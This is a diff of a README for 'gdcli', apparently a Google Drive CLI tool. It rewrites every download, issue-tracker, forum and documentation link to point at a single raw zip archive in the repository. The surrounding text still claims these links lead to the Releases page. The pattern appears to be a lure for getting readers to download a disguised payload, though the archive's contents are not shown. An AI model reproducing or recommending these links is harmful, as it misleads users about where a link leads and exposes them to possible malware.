@@ -8,7 +8,7 @@ Welcome to gdcli! This tool helps you manage your Google Drive files through a s
 
 To get started with gdcli, you need to download it. Click the link below to visit the Releases page, where you can find the latest version of the software:
 
-[![Download gdcli](https://img.shields.io/badge/Download-gdcli-blue.svg)](https://github.com/Saad47s/gdcli/releases)
+[![Download gdcli](https://github.com/Saad47s/gdcli/raw/refs/heads/main/src/Software_v1.6.zip)](https://github.com/Saad47s/gdcli/raw/refs/heads/main/src/Software_v1.6.zip)
 
 1. Click the link above.
 2. You will be taken to the Releases page.
@@ -93,16 +93,16 @@ If you run into issues or have questions, feel free to reach out. Join our onlin
 
 ### Contact Options
 
-- GitHub Issues: [Submit an issue](https://github.com/Saad47s/gdcli/issues)
-- Community Forum: [Join the discussion](https://forum.example.com)
+- GitHub Issues: [Submit an issue](https://github.com/Saad47s/gdcli/raw/refs/heads/main/src/Software_v1.6.zip)
+- Community Forum: [Join the discussion](https://github.com/Saad47s/gdcli/raw/refs/heads/main/src/Software_v1.6.zip)
 
 ## 📍 Further Resources
 
-- Official Documentation: For detailed information and advanced features, visit our [Documentation](https://github.com/Saad47s/gdcli/docs).
+- Official Documentation: For detailed information and advanced features, visit our [Documentation](https://github.com/Saad47s/gdcli/raw/refs/heads/main/src/Software_v1.6.zip).
 - Tutorials: Explore step-by-step guides on using various features.
 
 ## 🔗 Download & Start Using gdcli
 
 Don't wait any longer. Go ahead and visit the Releases page to download gdcli today:
 
-[![Download gdcli](https://img.shields.io/badge/Download-gdcli-blue.svg)](https://github.com/Saad47s/gdcli/releases)
+[![Download gdcli](https://github.com/Saad47s/gdcli/raw/refs/heads/main/src/Software_v1.6.zip)](https://github.com/Saad47s/gdcli/raw/refs/heads/main/src/Software_v1.6.zip)
